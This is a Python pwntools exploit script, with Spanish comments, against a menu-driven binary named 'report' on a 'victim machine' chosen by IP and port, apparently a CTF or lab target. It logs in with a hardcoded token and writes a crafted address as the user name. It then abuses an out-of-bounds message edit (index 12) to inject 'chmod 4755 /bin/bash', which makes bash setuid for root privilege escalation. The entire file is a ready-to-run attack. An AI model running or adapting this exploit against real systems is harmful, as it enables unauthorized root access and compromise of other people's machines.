#!/usr/bin/env python3

from pwn import context, log, p64, remote, sys
from argparse import ArgumentParser
import socket

context.binary = "report"

def connect_host(ip, port):
    """Crea una conexión remota con manejo explícito de errores."""

    try:
        return remote(ip, int(port))
    except socket.gaierror:
        print("[ERROR] No se pudo resolver el nombre del host.")
    except ConnectionRefusedError:
        print("[ERROR] La conexión fue rechazada. El puerto podría estar cerrado.")
    except TimeoutError:
        print("[ERROR] La conexión ha expirado por timeout.")
    except ValueError:
        print("[ERROR] El puerto proporcionado no es válido.")
    except OSError as e:
        print(f"[ERROR] Error de sistema al conectar: {e}")
    except Exception as e:
        print(f"[ERROR] Error inesperado: {e}")
    return None


def login(p):
    token = b"s3cretlug1wara"
    """Envía el token y el nombre."""
    p.sendlineafter(b"Enter Your Token: ", token)

    target_addr = context.binary.sym.userinfo1 + 40
    p.sendlineafter(b"Enter Name: ", p64(target_addr))

def create_message(p, title, msg):
    """Crea un mensaje usando el menú."""
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Message Title: ", title)
    p.sendlineafter(b"Message: ", msg)

def edit_message(p, index, new_title):
    """Edita un mensaje existente."""
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Enter number to edit: ", str(index).encode())
    p.sendlineafter(b"Message Title: ", new_title)

def exit_program(p):
    """Sale del menú."""
    p.sendlineafter(b"> ", b"5")

def main(ip, port):
    p = connect_host(ip, port)
    if not p:
        return

    login(p)
    create_message(p, b"AAAA", b"BBBB")
    edit_message(p, 12, b"chmod 4755 /bin/bash\x00")
    exit_program(p)

    p.close()

if __name__ == '__main__':

    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="ip de la maquina victima", required=True)
    parser.add_argument("-p", "--port", help="puerto de la maquina victima", required=True)

    args = parser.parse_args()
    main(args.ip, args.port)